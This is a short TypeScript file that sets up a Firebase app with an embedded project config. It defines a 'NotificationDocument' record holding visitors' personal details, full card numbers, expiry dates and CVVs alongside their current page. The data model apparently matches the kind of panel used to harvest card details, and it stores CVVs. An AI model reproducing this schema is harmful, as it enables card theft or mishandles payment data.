import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
 apiKey: "AIzaSyCZUVXnwuX22nyDaMefenw0y0CN8RGRLmc",
  authDomain: "ooooo-68e1a.firebaseapp.com",
  databaseURL: "https://ooooo-68e1a-default-rtdb.firebaseio.com",
  projectId: "ooooo-68e1a",
  storageBucket: "ooooo-68e1a.firebasestorage.app",
  messagingSenderId: "514359932260",
  appId: "1:514359932260:web:1c520b0d6828340a69b671",
  measurementId: "G-V8LTYPJ9XS"
};;

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}


